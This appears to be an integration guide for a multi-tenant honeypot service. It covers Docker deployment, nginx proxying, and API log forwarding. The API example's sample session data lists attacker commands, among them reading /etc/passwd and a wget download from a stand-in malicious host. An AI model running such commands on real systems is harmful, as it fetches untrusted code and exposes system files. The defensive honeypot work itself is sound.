# HoneySentinel AI — Client Onboarding & Integration Guide

## How It Works

HoneySentinel is a **multi-tenant honeypot-as-a-service** platform. Each client gets their own isolated honeypot deployment that feeds into a centralized dashboard. Here's how a new client's website or service gets integrated.

---

## Architecture Overview

```
Client Website/Service
        │
        ▼
┌─────────────────────────┐
│  Client Honeypot Node   │
│  (Docker container)     │
│  - SSH/FTP/HTTP emulators│
│  - Session capture      │
│  - Adaptive response    │
└────────────┬────────────┘
             │ HTTPS (session ingestion)
             ▼
┌─────────────────────────┐
│  Central Backend (Render)│
│  - AI analysis pipeline │
│  - Database (PostgreSQL)│
│  - Alert engine         │
└────────────┬────────────┘
             │
             ▼
┌─────────────────────────┐
│  Dashboard (Vercel)     │
│  - Real-time stats      │
│  - Live map             │
│  - Session logs         │
└─────────────────────────┘
```

---

## Integration Methods

### Method 1: Full Honeypot Deployment (Recommended)

Deploy a dedicated honeypot container on the client's infrastructure that captures attacks and sends analyzed sessions to your central backend.

**What the client needs:**
- A server/VM with Docker installed
- Outbound HTTPS access to your backend API
- Ports 2222, 2121, 8080, 8443 open for inbound traffic (or mapped to their public IPs)

**Steps:**

1. **Create a client node in the database:**
   ```bash
   curl -X POST https://YOUR_BACKEND.onrender.com/api/v1/nodes/ \
     -H "Authorization: Bearer <ADMIN_TOKEN>" \
     -H "Content-Type: application/json" \
     -d '{
       "name": "ClientName-Primary",
       "protocol": "multi",
       "ip_address": "<CLIENT_PUBLIC_IP>",
       "port": 0,
       "mode": "active",
       "location_lat": 40.7128,
       "location_lon": -74.0060
     }'
   ```

2. **Generate a unique ingest token for the client:**
   ```bash
   # In your backend, each client gets a unique HONEYPOT_INGEST_TOKEN
   # This token is used by their honeypot container to authenticate session submissions
   ```

3. **Deploy the honeypot container on the client's server:**
   ```bash
   # On the client's server:
   docker run -d \
     --name honeysentinel-honeypot \
     --network host \
     --cap-drop ALL \
     --cap-add NET_BIND_SERVICE \
     --read-only \
     --tmpfs /tmp:noexec,nosuid,size=100M \
     --security-opt no-new-privileges:true \
     -e HONEYPOT_CONTAINER=true \
     -e BACKEND_API_URL=https://YOUR_BACKEND.onrender.com/api/v1 \
     -e HONEYPOT_INGEST_TOKEN=<CLIENT_UNIQUE_TOKEN> \
     -e HONEYPOT_NODE_ID=<NODE_ID_FROM_STEP_1> \
     -e HONEYPOT_OPERATIONAL_MODE=active \
     -e HONEYPOT_ANTI_FINGERPRINT=true \
     -e HONEYPOT_ADAPTIVE_RESPONSE=true \
     -p 2222:2222 \
     -p 2121:2121 \
     -p 8080:8080 \
     -p 8443:8443 \
     your-registry/honeysentinel-honeypot:latest
   ```

4. **Create a client user account:**
   ```bash
   curl -X POST https://YOUR_BACKEND.onrender.com/api/v1/auth/register \
     -H "Content-Type: application/json" \
     -d '{
       "email": "admin@client-domain.com",
       "password": "<secure-password>",
       "name": "Client Admin",
       "role": "analyst"
     }'
   ```

5. **Client accesses the dashboard:**
   - URL: `https://YOUR-DASHBOARD.vercel.app`
   - They log in with their credentials
   - They only see sessions from their node(s)

---

### Method 2: Embedded Honeypot (Reverse Proxy)

If the client wants honeypot services running alongside their existing website without a separate server.

**Setup:**

1. **Add honeypot endpoints to the client's reverse proxy (nginx/Caddy):**
   ```nginx
   # nginx.conf on client's server
   server {
       listen 80;
       server_name client-domain.com;

       # Real website
       location / {
           proxy_pass http://localhost:3000;
       }

       # Honeypot SSH (mapped to non-standard port)
       location /ssh-honeypot {
           proxy_pass http://localhost:2222;
       }

       # Honeypot FTP
       location /ftp-honeypot {
           proxy_pass http://localhost:2121;
       }

       # Honeypot HTTP decoy
       location /api/decoy {
           proxy_pass http://localhost:8080;
       }
   }
   ```

2. **Run the honeypot container alongside their app:**
   ```bash
   docker run -d \
     --name honeysentinel-honeypot \
     -e BACKEND_API_URL=https://YOUR_BACKEND.onrender.com/api/v1 \
     -e HONEYPOT_INGEST_TOKEN=<CLIENT_TOKEN> \
     -e HONEYPOT_HTTP_PORT=8080 \
     your-registry/honeysentinel-honeypot:latest
   ```

---

### Method 3: API-Only Integration (Client Sends Their Own Logs)

If the client already has honeypots (Cowrie, Dionaea, etc.) and just wants your AI analysis + dashboard.

**Steps:**

1. **Create a client node** (same as Method 1, step 1)

2. **Client forwards their session data to your API:**
   ```bash
   curl -X POST https://YOUR_BACKEND.onrender.com/api/v1/sessions/ingest-internal \
     -H "X-Honeypot-Token: <CLIENT_TOKEN>" \
     -H "Content-Type: application/json" \
     -d '{
       "attacker_ip": "185.220.101.47",
       "attacker_port": 54321,
       "started_at": "2026-05-21T10:30:00+00:00",
       "status": "completed",
       "duration_seconds": 120.5,
       "commands": ["whoami", "cat /etc/passwd", "wget http://evil.com/malware"],
       "payload": "",
       "uploads": [],
       "failed_logins": 15,
       "packets": []
     }'
   ```

3. **Your backend runs the full AI pipeline:**
   - Attack classification (Random Forest)
   - NLP analysis (SpaCy)
   - Anomaly detection (Isolation Forest)
   - Attacker profiling
   - MITRE ATT&CK mapping
   - IoC extraction
   - Alert generation

4. **Results appear on the client's dashboard automatically**

---

## Multi-Tenant Data Isolation

Each client's data is isolated through:

| Layer | Mechanism |
|-------|-----------|
| **Network** | Each honeypot runs in an isolated Docker network with `internal: true` |
| **Authentication** | Unique `HONEYPOT_INGEST_TOKEN` per client |
| **Database** | Sessions linked to client-specific `node_id` |
| **Dashboard** | Row-level filtering by node (can be extended to tenant ID) |
| **Egress** | Honeypot containers can ONLY communicate with your backend API |

---

## What Happens When an Attacker Hits a Client's Honeypot

```
1. Attacker connects to client's honeypot (SSH/FTP/HTTP)
   ↓
2. Honeypot emulator engages attacker with realistic responses
   - Fake filesystem, commands, services
   - Adaptive behavior based on threat profile
   - Anti-fingerprinting (rotating banners, timing)
   ↓
3. All activity is captured:
   - Keystrokes, commands, file uploads
   - Authentication attempts
   - Network events
   ↓
4. Session ends → data sent to central backend via HTTPS
   - Authenticated with client's ingest token
   - Payload includes all captured data
   ↓
5. Backend AI pipeline processes the session:
   - Attack classification
   - NLP intent analysis
   - Anomaly scoring
   - Attacker profiling
   - MITRE ATT&CK mapping
   - IoC extraction
   ↓
6. Results stored in PostgreSQL, alerts generated
   ↓
7. Client sees results on their dashboard in real-time
   - New session appears in session logs
   - Attack shows on live map
   - Alerts triggered for high-severity events
   - Stats updated
```

---

## Client Dashboard Features

Every client gets access to:

| Feature | Description |
|---------|-------------|
| **Live Dashboard** | Real-time stats, attack distribution, recent alerts |
| **Threat Map** | Geographical visualization of attack origins |
| **Session Logs** | Full session drill-down with commands, files, analysis |
| **Alerts** | Severity-filtered alert management |
| **Honeypot Status** | Engine health, active sessions, security posture |
| **Settings** | Mode toggle (active/passive), protocol config, thresholds |
| **Export** | JSON, CEF, STIX/TAXII export for SIEM integration |

---

## Pricing Tiers (Example)

| Tier | Honeypot Nodes | Sessions/Month | Features |
|------|---------------|----------------|----------|
| **Starter** | 1 | 1,000 | Dashboard, basic AI analysis |
| **Professional** | 5 | 10,000 | + Adaptive response, MITRE mapping, export |
| **Enterprise** | Unlimited | Unlimited | + SIEM integration, custom emulators, SLA |

---

## Quick Start for New Clients

```bash
# 1. Client receives their onboarding package:
#    - Docker compose file
#    - .env with their unique token
#    - Dashboard credentials

# 2. Client runs:
docker compose up -d

# 3. Client logs into dashboard:
#    https://YOUR-DASHBOARD.vercel.app
#    Email: admin@client-domain.com
#    Password: (provided)

# 4. Attacks start appearing within minutes
```
